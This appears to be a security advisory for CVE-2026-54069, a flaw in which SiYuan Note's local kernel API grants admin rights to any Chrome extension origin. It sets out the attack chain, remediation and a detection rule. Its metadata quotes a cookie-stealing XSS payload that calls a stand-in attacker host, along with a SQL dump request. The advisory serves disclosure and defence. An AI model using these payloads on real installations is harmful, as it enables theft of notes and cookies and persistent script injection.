---
title: SiYuan Unauthenticated Admin API Access via Chrome Extension Allowlist
slug: 2026-07-siyuan-unauthenticated-admin-api-access
description: A critical vulnerability (CVE-2026-54069) in SiYuan Note kernel's HTTP server allows any Chrome/Chromium browser extension to gain unauthenticated RoleAdministrator access, enabling data exfiltration, stored XSS injection, and configuration tampering for SiYuan desktop users, including via compromised legitimate extensions.
date: "2026-07-10T19:38:31Z"
type: advisory
types:
  - advisory
severities:
  - critical
tags:
  - web-vulnerability
  - privilege-escalation
  - data-exfiltration
  - xss
  - supply-chain
  - desktop-application
  - chrome-extension
  - siyuan
vendors:
  - SiYuan
products:
  - SiYuan Note (<= v3.6.5)
  - SiYuan Kernel HTTP Server
mitre_ttps:
  - tactic_id: TA0004
    tactic_name: Privilege Escalation
    technique_id: T1068
    technique_name: Exploitation for Privilege Escalation
    evidence: SiYuan Note's kernel HTTP server unconditionally trusts all `chrome-extension://` origins, granting `RoleAdministrator` access to every installed browser extension without any authentication.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: ""
    evidence: 'A minimal Chrome extension with only default permissions: `bg.js -- runs as chrome-extension://<id>`'
    confidence_band: high
  - tactic_id: TA0010
    tactic_name: Exfiltration
    technique_id: T1005
    technique_name: Data from Local System
    evidence: 'Exfiltrate workspace data: `fetch(''http://127.0.0.1:6806/api/query/sql'', {...stmt: ''SELECT * FROM blocks LIMIT 100''})`'
    confidence_band: high
  - tactic_id: TA0010
    tactic_name: Exfiltration
    technique_id: T1041
    technique_name: Exfiltration Over C2 Channel
    evidence: '`<img src=x onerror="fetch(''https://attacker.example/steal?data=''+document.cookie)">`'
    confidence_band: high
  - tactic_id: TA0003
    tactic_name: Persistence
    technique_id: T1547
    technique_name: ""
    evidence: Configuration tampering via `/api/system/setConf`, enabling persistence and further attack surface expansion
    confidence_band: med
  - tactic_id: TA0008
    tactic_name: Impact
    technique_id: T1491
    technique_name: Defacement
    evidence: 'Inject stored XSS payload into a note: `api/block/insertBlock` with `<img src=x onerror="...">`'
    confidence_band: med
cves:
  - id: CVE-2026-54069
    epss: 0.00607
references:
  - https://github.com/advisories/GHSA-hvr9-72v2-fff3
  - CVE-2026-54069
iocs:
  - type: domain
    value: attacker.example
ioc_counts:
  domain: 1
rules:
  - title: Detect SiYuan Kernel Admin API Access from Browser Process
    description: Detects network connections from browser processes to the SiYuan kernel's local HTTP API port (6806). This may indicate attempted exploitation of CVE-2026-54069 by a malicious browser extension.
    platform: sigma
    severity: medium
    tactics:
      - exfiltration
      - privilege_escalation
    techniques:
      - T1005
      - T1068
    data_sources:
      - network_connection
      - windows
rules_count: 1
---

A critical vulnerability (CVE-2026-54069) has been identified in SiYuan Note's kernel HTTP server (versions <= v3.6.5). The server unconditionally trusts all `chrome-extension://` origins, granting `RoleAdministrator` access to every installed browser extension without any authentication. This oversight, combined with an empty default `AccessAuthCode` on desktop installations, means any Chrome or Chromium extension, including those with minimal permissions or a legitimately compromised one, can make fully authenticated admin API calls to the SiYuan kernel running on `127.0.0.1:6806`. This allows attackers to exfiltrate sensitive workspace data, inject persistent cross-site scripting (XSS) payloads into notes, and tamper with SiYuan's configuration, potentially leading to further compromise or data loss. The vulnerability acts as a privilege escalation and an initial access vector into the SiYuan application for malicious extensions.

## Attack Chain

1. A user installs a malicious or compromised Chrome/Chromium browser extension. The extension requires no special `host_permissions` as the SiYuan kernel is accessible via localhost.
2. The browser extension, executing its `bg.js` background script, initiates HTTP POST requests to the SiYuan kernel's API endpoint, typically `http://127.0.0.1:6806`.
3. The SiYuan kernel's `CheckAuth` middleware identifies the `Origin` header as `chrome-extension://` and unconditionally bypasses authentication.
4. The SiYuan kernel assigns `RoleAdministrator` to the incoming request, effectively granting full administrative control to the extension.
5. The malicious extension makes API calls such as `/api/system/getConf` to verify its administrative access.
6. The extension then exploits its administrative access to perform actions like data exfiltration using `/api/query/sql` to extract the entire workspace or inject stored XSS payloads into notes via `/api/block/insertBlock`.
7. Further impact can include configuration tampering via `/api/system/setConf`, potentially leading to persistence or expanded attack surface.
8. The attacker achieves data exfiltration, persistent code execution via XSS, or other destructive actions within the SiYuan application.

## Impact

The vulnerability (CVE-2026-54069) allows for full administrative control over the SiYuan Note kernel by any installed Chrome/Chromium extension. Successful exploitation enables unauthenticated data exfiltration of the entire workspace, including sensitive notes and documents, through APIs like `/api/query/sql`. Attackers can also inject stored XSS payloads into user notes, leading to persistent client-side code execution within the SiYuan application and potential session hijacking or further data compromise. Configuration tampering is possible via `/api/system/setConf`, which could be used to establish persistence or degrade the application's security. This vulnerability represents a significant supply chain risk, as a single compromised popular browser extension could silently affect a wide user base of SiYuan desktop users.

## Recommendation

* Patch CVE-2026-54069 by upgrading SiYuan Note to a version beyond `v3.6.5` that contains the fix for the blanket `chrome-extension://` allowlist.
* Implement host-based intrusion detection system (HIDS) rules to alert on suspicious network connections originating from browser processes (e.g., `chrome.exe`, `msedge.exe`) to `127.0.0.1` on port `6806`, as detailed in the Sigma rule below.
* Review web server or proxy logs (if applicable and configured to intercept loopback traffic) for HTTP POST requests to `/api/query/sql`, `/api/block/insertBlock`, or `/api/system/setConf` on `127.0.0.1:6806` with `Origin` headers starting with `chrome-extension://`.
* Monitor for unusual activity related to the SiYuan application, such as unexpected file modifications or API calls, which may indicate configuration tampering or data exfiltration.
